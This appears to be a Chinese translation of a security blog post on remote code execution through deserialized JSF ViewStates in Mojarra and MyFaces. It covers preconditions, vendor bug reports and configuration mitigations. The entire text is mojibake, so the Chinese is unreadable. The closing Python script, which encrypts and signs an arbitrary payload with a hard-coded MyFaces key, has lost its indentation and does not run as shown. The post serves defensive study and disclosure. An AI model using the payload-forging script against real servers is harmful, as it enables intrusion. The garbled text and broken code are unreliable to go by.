# ä»‹ç»

åœ¨æˆ‘ä»¬ç ”ç©¶äº†[é€šè¿‡é…ç½®é”™è¯¯çš„JSONåº“è¿›è¡ŒRCE](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)ä¹‹åï¼Œæˆ‘ä»¬å¼€å§‹åˆ†æJSFå®ç°çš„ViewStatesã€‚[JavaServer Faces (JSF)](https://en.wikipedia.org/wiki/JavaServer_Faces)æ˜¯ä¸€ç§ç”¨äºæ„å»ºå¯é‡ç”¨ç»„ä»¶çš„Webç”¨æˆ·ç•Œé¢ï¼ˆUIï¼‰æŠ€æœ¯ã€‚JSFä¸»è¦ç”¨äºä¼ä¸šåº”ç”¨ç¨‹åºï¼ŒJSFå®ç°é€šå¸¸ç”±åœ¨Javaåº”ç”¨æœåŠ¡å™¨ä¸Šè¿è¡Œçš„Webåº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œå¦‚JBoss EAPæˆ–WebLogic Serverã€‚JSFè§„èŒƒæœ‰ä¸¤ä¸ªä¼—æ‰€å‘¨çŸ¥çš„å®ç°ï¼š

* Oracle Mojarraï¼ˆJSFå‚è€ƒå®ç°ï¼‰
* Apache MyFaces

# èŒƒå›´

æœ¬åšå®¢æ–‡ç« é‡ç‚¹ä»‹ç»ä¸¤ä¸ªJSF 2.xå®ç°ï¼šOracle Mojarraï¼ˆå‚è€ƒå®ç°ï¼‰å’ŒApache MyFacesã€‚æ—§ç‰ˆæœ¬çš„å®ç°ï¼ˆJSF 1.xï¼‰ä¹Ÿå¯èƒ½å—åˆ°æœ¬æ–‡æ‰€è¿°æ¼æ´çš„å½±å“ã€‚ï¼ˆJSF 2.0.xæœ€åˆå‘å¸ƒäº2009å¹´ï¼Œå½“å‰ç‰ˆæœ¬ä¸º2.3.xï¼‰ã€‚

# ViewStateçš„çŠ¶æ€

JSFä¸ç±»ä¼¼çš„WebæŠ€æœ¯ä¹‹é—´çš„ä¸€ä¸ªåŒºåˆ«æ˜¯ï¼ŒJSFé™¤äº†ä¼šè¯ä¹‹å¤–è¿˜ä½¿ç”¨ViewStatesæ¥å­˜å‚¨è§†å›¾çš„å½“å‰çŠ¶æ€ï¼ˆä¾‹å¦‚ï¼Œå½“å‰åº”æ˜¾ç¤ºçš„è§†å›¾çš„å“ªäº›éƒ¨åˆ†ï¼‰ã€‚ViewStateå¯ä»¥å­˜å‚¨åœ¨`æœåŠ¡å™¨`æˆ–`å®¢æˆ·ç«¯`ä¸Šã€‚JSF ViewStatesé€šå¸¸ä¼šè‡ªåŠ¨åµŒå…¥åˆ°HTMLè¡¨å•ä¸­ä½œä¸ºéšè—å­—æ®µï¼Œå­—æ®µåä¸º`javax.faces.ViewState`ã€‚å¦‚æœæäº¤è¡¨å•ï¼Œåˆ™ä¼šå°†å®ƒä»¬å‘é€å›æœåŠ¡å™¨ã€‚

## æœåŠ¡å™¨ç«¯ViewState

å¦‚æœJSF ViewStateé…ç½®ä¸ºä½äº`æœåŠ¡å™¨`ä¸Šï¼Œåˆ™éšè—çš„`javax.faces.ViewState`å­—æ®µåŒ…å«ä¸€ä¸ªIDï¼Œè¯¥IDå¸®åŠ©æœåŠ¡å™¨æ£€ç´¢æ­£ç¡®çš„çŠ¶æ€ã€‚åœ¨MyFacesçš„æƒ…å†µä¸‹ï¼Œè¯¥IDæ˜¯ä¸€ä¸ª**åºåˆ—åŒ–çš„Javaå¯¹è±¡**ï¼

## å®¢æˆ·ç«¯ViewState

å¦‚æœJSF ViewStateé…ç½®ä¸ºä½äº`å®¢æˆ·ç«¯`ä¸Šï¼Œåˆ™éšè—çš„`javax.faces.ViewState`å­—æ®µåŒ…å«ä¸€ä¸ª**åºåˆ—åŒ–çš„Javaå¯¹è±¡**ï¼Œè‡³å°‘ç»è¿‡Base64ç¼–ç ã€‚æ‚¨å¯èƒ½å·²ç»æ„è¯†åˆ°ï¼Œè¿™æ˜¯ä¸€æ¡æ½œåœ¨çš„ç¾éš¾ä¹‹è·¯ï¼è¿™å¯èƒ½æ˜¯ç°åœ¨JSF ViewStatesåœ¨å‘é€åˆ°å®¢æˆ·ç«¯ä¹‹å‰è¿›è¡ŒåŠ å¯†å’Œç­¾åçš„åŸå› ä¹‹ä¸€ã€‚åºåˆ—åŒ–Javaå¯¹è±¡çš„å±é™©æ€§

2015å¹´ï¼Œåœ¨AppSec Californiaä¼šè®®ä¸Šï¼Œ[Gabriel Lawrence](https://twitter.com/gebl)å’Œ[Chris Frohoff](https://twitter.com/frohoff)ä¸¾è¡Œäº†ä¸€ä¸ªåä¸º[Marshalling Pickles (how deserializing objects can ruin your day)](https://frohoff.github.io/appseccali-marshalling-pickles/)çš„æ¼”è®²ã€‚è¿™ä¸ªæ¼”è®²æ­ç¤ºäº†Javaå¯¹è±¡åºåˆ—åŒ–çš„ä¸€äº›è¢«é—å¿˜çš„é—®é¢˜ï¼Œå¹¶å¯¼è‡´äº†[å‡ ä¸ªä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)çš„å‘ç°ã€‚

ä¸å¹¸çš„æ˜¯ï¼Œè¿™å¯¼è‡´ä¸€äº›äººè®¤ä¸ºé€šè¿‡åˆ é™¤/æ›´æ–°æŸäº›ç‰ˆæœ¬çš„Apache Commons Collectionså¯ä»¥å‡è½»æ¼æ´ã€‚è¿™ç¡®å®å¯ä»¥å¸®åŠ©ï¼Œä½†ä¸èƒ½è§£å†³é—®é¢˜çš„æ ¹æœ¬åŸå› ï¼šå¯¹ä¸å—ä¿¡ä»»æ•°æ®çš„ååºåˆ—åŒ–ï¼ˆ[CWE 502](https://cwe.mitre.org/data/definitions/502.html)ï¼‰ã€‚æ¢å¥è¯è¯´ï¼š\
**ä½¿ç”¨â€œæ˜“å—æ”»å‡»â€çš„Apache Commons Collectionsç‰ˆæœ¬å¹¶ä¸æ„å‘³ç€åº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œè€Œæ²¡æœ‰è¿™æ ·çš„åº“ç‰ˆæœ¬ä¹Ÿå¹¶ä¸æ„å‘³ç€åº”ç”¨ç¨‹åºæ²¡æœ‰æ¼æ´ã€‚**

ç„¶è€Œï¼Œåœ¨ä¸€ä¸ªæ¶æ„é»‘å®¢é€šè¿‡â€œMad Gadgetâ€/â€œApache Commons Collections Deserialization Vulnerabilityâ€å…³é—­å¹¶åŠ å¯†äº†æ—§é‡‘å±±å¸‚äº¤é€šå±€çš„ç³»ç»Ÿä¹‹åï¼Œè°·æ­Œå¯åŠ¨äº†[Operation Rosehub](https://opensource.googleblog.com/2017/03/operation-rosehub.html)ã€‚Operation Rosehubçš„ç›®æ ‡æ˜¯å°½å¯èƒ½å¤šåœ°æ‰¾åˆ°ä½¿ç”¨â€œæ˜“å—æ”»å‡»â€çš„commons collectionsç‰ˆæœ¬ä½œä¸ºä¾èµ–é¡¹çš„Javaå¼€æºé¡¹ç›®ï¼Œå¹¶å‘é¡¹ç›®æ‰€æœ‰è€…æäº¤æ‹‰å–è¯·æ±‚ï¼Œä»¥ä¾¿è¿™äº›é¡¹ç›®åœ¨æ–°ç‰ˆæœ¬ä¸­åœæ­¢ä½¿ç”¨æœ‰é—®é¢˜çš„commons collectionsç‰ˆæœ¬ã€‚
# å¯¹ViewStateçš„æ”»å‡»

å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªåŸºäºJSFçš„Webåº”ç”¨ç¨‹åºï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªç™»å½•é¡µé¢ï¼š

![åŸºäºJSFçš„ç™»å½•é¡µé¢](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-login.png)

è¯¥ç™»å½•é¡µé¢å…·æœ‰ä¸€ä¸ªæœªåŠ å¯†ä¸”æœªç­¾åçš„ViewStateã€‚å› æ­¤ï¼Œå½“æˆ‘ä»¬æŸ¥çœ‹å…¶HTMLæºä»£ç æ—¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°ä¸€ä¸ªåŒ…å«ViewStateçš„éšè—å­—æ®µï¼šæœªåŠ å¯†çš„MyFaces ViewStateï¼š
```
<input type="hidden" name="javax.faces.ViewState" id="j_id__v_0:javax.faces.ViewState:1" value="rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s" autocomplete="off" />
```
å¦‚æœæ‚¨ä½¿ç”¨Base64è§£ç ä¸Šè¿°ViewStateï¼Œæ‚¨ä¼šæ³¨æ„åˆ°å®ƒåŒ…å«ä¸€ä¸ªåºåˆ—åŒ–çš„Javaå¯¹è±¡ã€‚å½“è¡¨å•æäº¤æ—¶ï¼ˆä¾‹å¦‚ç‚¹å‡»ç™»å½•ï¼‰ï¼Œæ­¤ViewStateé€šè¿‡POSTå‘é€å›æœåŠ¡å™¨ã€‚ç°åœ¨ï¼Œåœ¨ViewStateè¢«å‘é€å›æœåŠ¡å™¨ä¹‹å‰ï¼Œæ”»å‡»è€…ä½¿ç”¨æœåŠ¡å™¨ç±»è·¯å¾„ä¸Šå·²ç»å­˜åœ¨çš„gadgetï¼ˆä¾‹å¦‚`commons-collections-3.2.1.jar`ä¸­çš„`InvokerTransformer`ï¼‰æˆ–è€…ç”šè‡³æ˜¯å…¬ä¼—å°šæœªçŸ¥æ™“çš„gadgetï¼Œå°†ViewStateæ›¿æ¢ä¸ºè‡ªå·±çš„æ¶æ„ViewStateã€‚é€šè¿‡åœ¨ViewStateä¸­æ”¾ç½®æ¶æ„gadgetï¼Œæ”»å‡»è€…å¯ä»¥æŒ‡å®šä»–æƒ³åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œçš„å‘½ä»¤ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡`InvokerTransformer`æŒ‡å®šè¦åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤è¡Œå‘½ä»¤ã€‚åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…é€‰æ‹©åœ¨æˆ‘ä»¬åŸºäºLinuxçš„æœåŠ¡å™¨çš„UIä¸Šå¯åŠ¨è®¡ç®—å™¨ã€‚

åœ¨æ”»å‡»è€…å°†ä¿®æ”¹åçš„è¡¨å•å‘é€å›æœåŠ¡å™¨åï¼ŒJSFå®ç°å°è¯•ååºåˆ—åŒ–æä¾›çš„ViewStateã€‚ç°åœ¨ï¼Œåœ¨ViewStateçš„ååºåˆ—åŒ–ç»“æŸä¹‹å‰ï¼Œå‘½ä»¤è¢«æ‰§è¡Œï¼Œè®¡ç®—å™¨åœ¨æœåŠ¡å™¨ä¸Šå¯åŠ¨ï¼š

![é€šè¿‡JSF ViewStateå¯åŠ¨çš„è®¡ç®—å™¨](https://www.alphabot.com/images/blog/jsf-viewstate/jsf-viewstate-started-calculator.png)

æ‰€æœ‰è¿™äº›éƒ½å‘ç”Ÿåœ¨JSFå®ç°æ£€æŸ¥ViewStateå¹¶åˆ¤æ–­å…¶æ˜¯å¦æœ‰æ•ˆä¹‹å‰ã€‚å½“å‘ç°ViewStateæ— æ•ˆæ—¶ï¼Œé€šå¸¸ä¼šå‘å®¢æˆ·ç«¯å‘é€é”™è¯¯æ¶ˆæ¯ï¼Œä¾‹å¦‚â€œè§†å›¾å·²è¿‡æœŸâ€ã€‚ä½†é‚£æ—¶å·²ç»å¤ªæ™šäº†ã€‚æ”»å‡»è€…å·²ç»è®¿é—®äº†æœåŠ¡å™¨å¹¶è¿è¡Œäº†å‘½ä»¤ã€‚ï¼ˆå¤§å¤šæ•°çœŸå®ä¸–ç•Œçš„æ”»å‡»è€…ä¸ä¼šå¯åŠ¨è®¡ç®—å™¨ï¼Œè€Œæ˜¯é€šå¸¸éƒ¨ç½²è¿œç¨‹shellï¼Œç„¶åä½¿ç”¨å®ƒæ¥è®¿é—®æœåŠ¡å™¨ã€‚ï¼‰

=> æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªç¤ºä¾‹æ¼”ç¤ºäº†ä¸€ä¸ªéå¸¸å±é™©çš„æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰æ¼æ´ã€‚

ï¼ˆå‡ ä¹ä¸ä¸Šè¿°æ‰€ç¤ºçš„JSFæ”»å‡»åœºæ™¯ç›¸åŒçš„æ”»å‡»åœºæ™¯å·²ç»åœ¨2015å¹´çš„æ¼”ç¤ºä¸­æ¦‚è¿°å’Œæ¼”ç¤ºï¼ˆç¬¬65è‡³67é¡µï¼‰ï¼š[Marshalling Pickles](https://frohoff.github.io/appseccali-marshalling-pickles/)ï¼Œç”±Frohoffå’ŒLawrenceä¸»æŒã€‚ï¼‰

# æˆåŠŸæ”»å‡»çš„å‰ææ¡ä»¶

é‚£ä¹ˆï¼Œé€ æˆç¾éš¾çš„æ¡ä»¶æ˜¯ä»€ä¹ˆï¼Ÿ

* æœªåŠ å¯†çš„ViewStateï¼ˆæˆ–è€…æ‹¥æœ‰åŠ å¯†å¯†é’¥ï¼‰
* æœåŠ¡å™¨ç±»è·¯å¾„ä¸Šçš„gadget
* å¯¹äºMojarraï¼šå°†ViewStateé…ç½®ä¸ºé©»ç•™åœ¨â€œclientâ€ä¸Š
* å¯¹äºMyFacesï¼šå°†ViewStateé…ç½®ä¸ºé©»ç•™åœ¨â€œclientâ€æˆ–â€œserverâ€ä¸Š

è®©æˆ‘ä»¬çœ‹çœ‹è¿™äº›ç‚¹ä¸ä¸¤ä¸ªJSFå®ç°çš„å…³ç³»ã€‚

# Oracle Mojarraï¼ˆJSFå‚è€ƒå®ç°ï¼‰

å¦‚å‰æ‰€è¿°ï¼ŒOracle Mojarraæ˜¯JSFå‚è€ƒå®ç°ï¼ˆRIï¼‰ï¼Œä½†å¯èƒ½ä¸ä»¥è¯¥åç§°ä¸ºäººæ‰€çŸ¥ã€‚å®ƒå¯èƒ½è¢«ç§°ä¸ºSun JSF RIï¼Œä½¿ç”¨javaåŒ…å`com.sun.faces`æˆ–å…·æœ‰æ¨¡ç³Šçš„jaråç§°`jsf-impl.jar`ã€‚

## Mojarraï¼šæœªåŠ å¯†çš„ViewState

äº‹å®æ˜¯ï¼šåœ¨å¤§å¤šæ•°2.0.xå’Œ2.1.xç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒMojarraæ²¡æœ‰å¯¹å®¢æˆ·ç«¯çš„ViewStateè¿›è¡ŒåŠ å¯†å’Œç­¾åã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæœåŠ¡å™¨ç«¯ViewStateæ˜¯ä¸¤ä¸ªJSFå®ç°çš„é»˜è®¤è®¾ç½®ï¼Œä½†å¼€å‘äººå‘˜å¯ä»¥é€šè¿‡å°†`javax.faces.STATE_SAVING_METHOD`å‚æ•°è®¾ç½®ä¸º`client`æ¥è½»æ¾åˆ‡æ¢é…ç½®ä»¥ä½¿ç”¨å®¢æˆ·ç«¯çš„viewstateã€‚è¯¥å‚æ•°åç§°å¹¶ä¸é€éœ²å°†å…¶æ›´æ”¹ä¸ºclientä¼šå¼•å…¥ä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆä¾‹å¦‚ï¼Œé›†ç¾¤Webåº”ç”¨ç¨‹åºå¯èƒ½ä½¿ç”¨å®¢æˆ·ç«¯çš„viewstateï¼‰ã€‚

è™½ç„¶åœ¨Mojarra 2.2åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨å®¢æˆ·ç«¯ViewStateåŠ å¯†ï¼Œä½†åœ¨2.0.xå’Œ2.1.xåˆ†æ”¯ä¸­å¹¶éå¦‚æ­¤ã€‚ç„¶è€Œï¼Œ2016å¹´5æœˆï¼ŒMojarraå¼€å‘äººå‘˜å¼€å§‹å°†é»˜è®¤çš„å®¢æˆ·ç«¯ViewStateåŠ å¯†å›æº¯åˆ°[2.0.x](https://github.com/javaserverfaces/mojarra/issues/4142)å’Œ[2.1.x](https://github.com/javaserverfaces/mojarra/issues/4141)ï¼Œå½“ä»–ä»¬æ„è¯†åˆ°æœªåŠ å¯†çš„ViewStateä¼šå¯¼è‡´RCEæ¼æ´æ—¶ã€‚

å› æ­¤ï¼Œè‡³å°‘ä»2.1.xåˆ†æ”¯çš„[2.1.29-08](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-08)ç‰ˆæœ¬ï¼ˆäº2016å¹´7æœˆå‘å¸ƒï¼‰å’Œ2.0.xçš„[2.0.11-04](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.11-04)ç‰ˆæœ¬ï¼ˆä¹Ÿäº2016å¹´7æœˆå‘å¸ƒï¼‰å¼€å§‹ï¼Œé»˜è®¤æƒ…å†µä¸‹å¯ç”¨äº†åŠ å¯†ã€‚

å½“æˆ‘ä»¬åˆ†æMojarraåº“æ—¶ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°Red Hatä¹Ÿå‘å¸ƒäº†2.1.xå’Œ2.0.xåˆ†æ”¯çš„Mojarraç‰ˆæœ¬ï¼Œæœ€æ–°ç‰ˆæœ¬æ˜¯[2.1.29-jbossorg-1](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.1.29-jbossorg-1)å’Œ[2.0.4-b09-jbossorg-4](https://mvnrepository.com/artifact/com.sun.faces/jsf-impl/2.0.4-b09-jbossorg-4)ã€‚ç”±äºè¿™ä¸¤ä¸ªç‰ˆæœ¬éƒ½æ²¡æœ‰é»˜è®¤çš„ViewStateåŠ å¯†ï¼Œæˆ‘ä»¬è”ç³»äº†Red Hatï¼Œä»–ä»¬è¿…é€Ÿåœ¨å…¶ç¼ºé™·è·Ÿè¸ªå™¨ä¸­åˆ›å»ºäº†[Bug 1479661 - JSF client side view state saving deserializes data](https://bugzilla.redhat.com/show_bug.cgi?id=1479661)ï¼Œå¹¶æä¾›äº†ä»¥ä¸‹å¯¹äº2.1.xåˆ†æ”¯çš„ç¼“è§£å»ºè®®ï¼š

> ä¸€ä¸ªæ˜“å—æ”»å‡»çš„Webåº”ç”¨ç¨‹åºéœ€è¦å°†javax.faces.STATE_SAVING_METHODè®¾ç½®ä¸º'client'ä»¥å¯ç”¨å®¢æˆ·ç«¯è§†å›¾çŠ¶æ€ä¿å­˜ã€‚åœ¨ä¼ä¸šåº”ç”¨å¹³å°ï¼ˆEAPï¼‰6.4.xä¸Šçš„é»˜è®¤å€¼ä¸º'server'ã€‚\
> \
> å¦‚æœå°†javax.faces.STATE_SAVING_METHODè®¾ç½®ä¸º'client'ï¼Œåˆ™å¯ä»¥é€šè¿‡åœ¨åº”ç”¨ç¨‹åºçš„web.xmlä¸­è®¾ç½®com.sun.faces.ClientStateSavingPasswordæ¥åŠ å¯†è§†å›¾ï¼š
>
> ```markup
>   <context-param>
>     <param-name>javax.faces.STATE_SAVING_METHOD</param-name>
>     <param-value>client</param-value>
>   </context-param>
>
>   <envÂ­-entry>
>     <envÂ­-entry-Â­name>com.sun.faces.ClientStateSavingPassword</envÂ­-entry-Â­name>
>     <env-Â­entry-Â­type>java.lang.String</env-Â­entry-Â­type>
>     <env-Â­entry-Â­value>[some secret password]</env-Â­entry-Â­value>
>   </envÂ­-entry>
> ```

ä¸å¹¸çš„æ˜¯ï¼Œåœ¨ä¸€äº›æ›´æ—§çš„ç‰ˆæœ¬ä¸­ï¼Œè¿™ç§ç¼“è§£æ–¹æ³•ä¸èµ·ä½œç”¨ï¼šæ ¹æ®[è¿™ä¸ªå¾ˆæ£’çš„StackOverflowç­”æ¡ˆ](https://stackoverflow.com/questions/28231372/com-sun-faces-clientstatesavingpassword-recommendations-for-actual-password)ï¼Œåœ¨JSFå®ç°æ–‡æ¡£ä¸­é”™è¯¯åœ°è®°å½•äº†å‚æ•°`com.sun.faces.ClientStateSavingPassword`ç”¨äºæ›´æ”¹å®¢æˆ·ç«¯çŠ¶æ€ä¿å­˜å¯†ç ï¼Œè€Œç›´åˆ°2.1.18ç‰ˆæœ¬ï¼Œè¯¥å‚æ•°é”™è¯¯åœ°è¢«ç§°ä¸º`ClientStateSavingPassword`ã€‚å› æ­¤ï¼ŒæŒ‰ç…§æ–‡æ¡£æä¾›çš„æ–¹å¼æä¾›å®¢æˆ·ç«¯çŠ¶æ€ä¿å­˜å¯†ç æ²¡æœ‰æ•ˆæœï¼åœ¨Mojarra 2.1.19åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼Œä»–ä»¬å°†å‚æ•°åç§°æ›´æ”¹ä¸ºæ–‡æ¡£ä¸­çš„åç§°`com.sun.faces.ClientStateSavingPassword`ã€‚

Mojarraç°åœ¨é»˜è®¤ä½¿ç”¨`AES`ä½œä¸ºåŠ å¯†ç®—æ³•ï¼Œå¹¶ä½¿ç”¨`HMAC-SHA256`å¯¹ViewStateè¿›è¡Œèº«ä»½éªŒè¯ã€‚
## Mojarra: ViewStateé…ç½®ä¸ºå­˜å‚¨åœ¨å®¢æˆ·ç«¯

Mojarraçš„é»˜è®¤`javax.faces.STATE_SAVING_METHOD`è®¾ç½®ä¸º`server`ã€‚å¼€å‘äººå‘˜éœ€è¦æ‰‹åŠ¨å°†å…¶æ›´æ”¹ä¸º`client`ï¼Œä»¥ä½¿Mojarraå˜å¾—å®¹æ˜“å—åˆ°ä¸Šè¿°æè¿°çš„æ”»å‡»åœºæ™¯çš„å½±å“ã€‚å¦‚æœå°†åºåˆ—åŒ–çš„ViewStateå‘é€åˆ°æœåŠ¡å™¨ï¼Œä½†Mojarraä½¿ç”¨`server`ç«¯çš„ViewStateä¿å­˜ï¼Œå®ƒå°†ä¸ä¼šå°è¯•å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–ï¼ˆä½†å¯èƒ½ä¼šå‡ºç°`StringIndexOutOfBoundsException`ï¼‰ã€‚

## Mojarra: ç¼“è§£æªæ–½

å½“ä½¿ç”¨å…·æœ‰æœåŠ¡å™¨ç«¯ViewStateçš„Mojarraæ—¶ï¼Œæ— éœ€é‡‡å–ä»»ä½•æªæ–½ã€‚

å½“ä½¿ç”¨Mojarra < 2.2å’Œå®¢æˆ·ç«¯ViewStateæ—¶ï¼Œæœ‰ä»¥ä¸‹å¯èƒ½çš„ç¼“è§£æªæ–½ï¼š

* å°†Mojarraæ›´æ–°åˆ°2.0.11-04æˆ–2.1.29-08ã€‚
* ä½¿ç”¨æœåŠ¡å™¨ç«¯ViewStateè€Œä¸æ˜¯å®¢æˆ·ç«¯ViewStateã€‚
* å½“ä½¿ç”¨è¾ƒæ—§ç‰ˆæœ¬çš„Mojarraä¸”æ— æ³•è¿›è¡Œæ›´æ–°æˆ–åˆ‡æ¢åˆ°æœåŠ¡å™¨ç«¯ViewStateæ—¶ï¼šè®¾ç½®ä¸€ä¸ªViewStateå¯†ç ä½œä¸ºä¸´æ—¶è§£å†³æ–¹æ¡ˆï¼Œå¹¶ç¡®ä¿å®ƒæ˜¯æ­£ç¡®çš„å‚æ•°ï¼ˆä¸ä¸€å®šæ˜¯ç›¸åº”æ–‡æ¡£ä¸­çš„å‚æ•°ï¼‰ã€‚

å¯¹äºè¾ƒæ–°çš„Mojarraç‰ˆæœ¬ï¼š

* æ£€æŸ¥ViewStateåŠ å¯†æ˜¯å¦é€šè¿‡å‚æ•°`com.sun.faces.disableClientStateEncryption`ç¦ç”¨ã€‚

# Apache MyFaces

Apache MyFacesæ˜¯å¦ä¸€ä¸ªå¤§å‹ä¸”å¹¿æ³›ä½¿ç”¨çš„JSFå®ç°ã€‚

## MyFaces: æœªåŠ å¯†çš„ViewState

MyFacesé»˜è®¤æƒ…å†µä¸‹ä¼šå¯¹ViewStateè¿›è¡ŒåŠ å¯†ï¼Œå¦‚å…¶[å®‰å…¨é…ç½®Wikié¡µé¢](https://wiki.apache.org/myfaces/Secure_Your_Application)æ‰€è¿°ï¼š

> é»˜è®¤æƒ…å†µä¸‹å¯ç”¨åŠ å¯†ã€‚è¯·æ³¨æ„ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¿…é¡»ä½¿ç”¨åŠ å¯†ï¼Œè€Œç¦ç”¨åŠ å¯†åªèƒ½åœ¨æµ‹è¯•/å¼€å‘ç¯å¢ƒä¸­æœ‰æ•ˆã€‚

ä½†æ˜¯ï¼Œå¯ä»¥é€šè¿‡å°†å‚æ•°`org.apache.myfaces.USE_ENCRYPTION`è®¾ç½®ä¸º`false`æ¥ç¦ç”¨ViewStateåŠ å¯†ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨åŠ å¯†ï¼Œä½†æ‰‹åŠ¨è®¾ç½®ä¸€ä¸ªæ˜“äºçŒœæµ‹çš„å¯†ç ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯æ¬¡æœåŠ¡å™¨é‡æ–°å¯åŠ¨æ—¶ï¼ŒViewStateåŠ å¯†å¯†é’¥éƒ½ä¼šæ›´æ”¹ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒMyFacesä½¿ç”¨`DES`ä½œä¸ºåŠ å¯†ç®—æ³•ï¼Œå¹¶ä½¿ç”¨`HMAC-SHA1`å¯¹ViewStateè¿›è¡Œèº«ä»½éªŒè¯ã€‚å¯ä»¥é…ç½®æ›´è¿‘æœŸçš„ç®—æ³•ï¼Œå¦‚`AES`å’Œ`HMAC-SHA256`ã€‚

## MyFaces: ViewStateé…ç½®ä¸ºå­˜å‚¨åœ¨å®¢æˆ·ç«¯

MyFacesçš„é»˜è®¤`javax.faces.STATE_SAVING_METHOD`è®¾ç½®ä¸º`server`ã€‚ä½†æ˜¯ï¼š**MyFaceså§‹ç»ˆä¼šååºåˆ—åŒ–ViewState**ï¼Œæ— è®ºè¯¥è®¾ç½®å¦‚ä½•ã€‚å› æ­¤ï¼Œ[åœ¨ä½¿ç”¨MyFacesæ—¶ä¸è¦ç¦ç”¨åŠ å¯†éå¸¸é‡è¦](https://issues.apache.org/jira/browse/MYFACES-4021)ï¼

ï¼ˆæˆ‘ä»¬åœ¨MyFacesé”™è¯¯è·Ÿè¸ªå™¨ä¸­åˆ›å»ºäº†ä¸€ä¸ªé—®é¢˜ï¼š[MYFACES-4133 å¦‚æœçŠ¶æ€ä¿å­˜æ–¹æ³•ä¸ºæœåŠ¡å™¨ï¼Œåˆ™ä¸è¦ååºåˆ—åŒ–ViewState-ID](https://issues.apache.org/jira/browse/MYFACES-4133)ï¼Œä¹Ÿè®¸[è¿™æ¬¡](https://issues.apache.org/jira/browse/MYFACES-4021)å¯¹æ›´å®‰å…¨çš„é»˜è®¤è®¾ç½®çš„æœŸæœ›ä¼šå®ç°ã€‚ï¼‰

## MyFaces: ç¼“è§£æªæ–½

åœ¨ä½¿ç”¨MyFacesæ—¶ï¼Œè¯·ç¡®ä¿ViewStateçš„åŠ å¯†æœªè¢«ç¦ç”¨ï¼ˆé€šè¿‡`org.apache.myfaces.USE_ENCRYPTION`ï¼‰ï¼Œæ— è®ºViewStateå­˜å‚¨åœ¨å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ä¸Šã€‚

## è‡ªå®šä¹‰åŠ å¯†

å¦‚æœä»¥æŸç§æ–¹å¼çªƒå–äº†ä½¿ç”¨çš„å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨æ­¤è„šæœ¬å¯¹WebæœåŠ¡å™¨è¿›è¡ŒåŠ å¯†å’Œç­¾åæ”»å‡»ï¼š
```python
#!/usr/bin/python3
import sys
import hmac
from urllib import parse
from base64 import b64encode
from hashlib import sha1
from pyDes import *

YELLOW = "\033[93m"
GREEN = "\033[32m"

def encrypt(payload,key):
cipher = des(key, ECB, IV=None, pad=None, padmode=PAD_PKCS5)
enc_payload = cipher.encrypt(payload)
return enc_payload

def hmac_sig(enc_payload,key):
hmac_sig = hmac.new(key, enc_payload, sha1)
hmac_sig = hmac_sig.digest()
return hmac_sig

key = b'JsF9876-'

if len(sys.argv) != 3 :
print(YELLOW + "[!] Usage : {} [Payload File] [Output File]".format(sys.argv[0]))
else:
with open(sys.argv[1], "rb") as f:
payload = f.read()
f.close()
print(YELLOW + "[+] Encrypting payload")
print(YELLOW + "  [!] Key : JsF9876-\n")
enc_payload = encrypt(payload,key)
print(YELLOW + "[+] Creating HMAC signature")
hmac_sig = hmac_sig(enc_payload,key)
print(YELLOW + "[+] Appending signature to the encrypted payload\n")
payload = b64encode(enc_payload + hmac_sig)
payload = parse.quote_plus(payload)
print(YELLOW + "[*] Final payload : {}\n".format(payload))
with open(sys.argv[2], "w") as f:
f.write(payload)
f.close()
print(GREEN + "[*] Saved to : {}".format(sys.argv[2]))
```
# ä½¿ç”¨Badsecretsè¿›è¡Œå·²çŸ¥å¯†é’¥æ£€æµ‹

